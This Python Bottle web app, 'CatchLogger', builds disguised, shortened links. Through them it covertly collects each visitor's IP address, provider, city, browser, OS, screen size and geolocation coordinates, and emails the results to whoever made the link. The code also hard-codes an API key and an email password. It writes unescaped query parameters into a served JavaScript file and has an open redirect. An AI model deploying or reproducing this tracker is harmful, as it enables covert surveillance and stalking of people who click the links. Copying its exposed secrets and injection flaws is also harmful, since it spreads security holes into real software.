import os
import sqlite3
import smtplib
import json
import requests
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from bottle import *
from socket import gethostname, gethostbyname 

def page_file(root, filename):
    return static_file(filename, root=root)

def html(filename):
	filename += ".html"
	return static_file(filename, root="./html/")

def shorten(link):
    url = "https://www.googleapis.com/urlshortener/v1/url?key=AIzaSyAKytZN_unLk1FNtcISeYoWIcm2d8jSPXU"
    header = {'Content-Type': 'application/json'}
    r = requests.post(url, json={"longUrl": link}, headers=header)
    r = json.loads(r.text)
    r = r["id"]
    return r

def send_email(text, addr): 
    fromaddr = "catchlogger.noreply@gmail.com"
    toaddr = "andtun@yandex.ru"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "CatchLogger results"
     
    body = text
    msg.attach(MIMEText(body, 'plain'))
     
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "adminpsw")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()


@get("/")
def man():
    return html("index")

@get("/get_info")
def obr():
    adr = request.query.email
    ip = (request.environ.get('HTTP_X_FORWARDED_FOR') or request.environ.get('REMOTE_ADDR'))
    print(ip)
    d = {}
    info = list("browser, language, OS, navbrser, navos, h, w, location_info".split(", "))
    for i in info:
         d[i] = request.query[i]
         print("i: "+i+"  --  "+d[i])
    coords = list(d['location_info'].split("|"))
    try:
    	d['lat'] = coords[0]
    	d['long'] = coords[1]
    	d['rad'] = coords[2]
    except TypeError:
    	d['lat'] = 'undefined'
    	d['long'] = 'undefined'
    	d['rad'] = "Okay"
    APIipADDR = "http://ip-api.com/json/"+ip
    ip_dic = json.loads(requests.get(APIipADDR).text)
    text = """By navigator:
Browser: %s
Language: %s
OS: %s

By BrowserDetect:
Browser: %s
OS: %s

Window:
Height: %s
Width: %s

Location:
latitude: %s
longitude: %s
Radius: %s
Location link: http://catchlogger.herokuapp.com/locvar_access?lat=%s&lng=%s&rad=%s

IP = %s
Provider: %s
Region, city: %s, %s

----
CatchLogger system by Andrey A Tyunyatkin""" % (d['browser'], d['language'], d['OS'], d['navbrser'], d['navos'], d['h'], d['w'], d['lat'], d['long'], d['rad'], d['lat'], d['long'], d['rad'], ip, ip_dic["org"], ip_dic["regionName"], ip_dic["city"])
    send_email(text, adr)
    print("SENT MAIL TO " + str(adr))
    

@get("/login")
def login():
	return html("login")

@get("/locvar_access")
def lcvr():
    lat = request.query['lat']
    lng = request.query['lng']
    rad = request.query['rad']
    locvar = open("locvar_storage.js", 'w')
    towrite = """var get_lat = %s
var get_lng = %s
var get_rad = %s""" % (lat, lng, rad)
    locvar.write(towrite)
    locvar.close()
    return static_file("circler.html", root='.')


@get("/spasibi")
def faq():
    return html("spasibi")

# test logger
@get("/catch")
def chk():
    return html("catch")
#---------------

@get("/link")
def redir():
    rq = request.query
    return template("catch.html", whereto=rq['whereto'], method=rq['method'], email=rq['email'])

@post("/createlink/<method>")
def prcss(method):
    rq = request.forms
    howto = rq.get("howto")
    if method == "email":
        link_addr = rq.get("link_addr")
        email = rq.get("email")
        link = "https://catchlogger.herokuapp.com/link?whereto=%s&email=%s&method=%s" % (link_addr, email, method)

        if howto == "SafeR":
            link = "http://catchlogger.blogspot.com/p/blog-page.html?red=" + link

        return link, shorten(link)

        
# =========================FOR BEAUTY==========================

@route("/<root>/<filename>")
def f(root, filename):
    return page_file(root, filename)

@route("/css/font-awesome/css/font-awesome.min.css")
def font():
    return static_file("font-awesome.min.css", root="./css/font-awesome/css/")

@route("/images/logo.png")
def logo():
    return static_file("Logo.png", root='./images/')

@route("/locvar_storage.js")
def locvar():
    return static_file("locvar_storage.js", root='.')

@get("/getXML.js")
def js():
    return static_file("getXML.js", root="./js/")

@get("/browser.js")
def br():
    return static_file("browser.js", root='./js/')

#@error(404)
#def fff(error):
#    return html("404")

#@error(500)

#def fff(error):
#    return html("500")
# -------------------------------------------------------------

@get("/<somewhere>")
def red(somewhere):
    somewhere = "http://" + somewhere
    redirect(somewhere)


run(host="0.0.0.0", port=os.environ.get('PORT', 5000), debug=True)
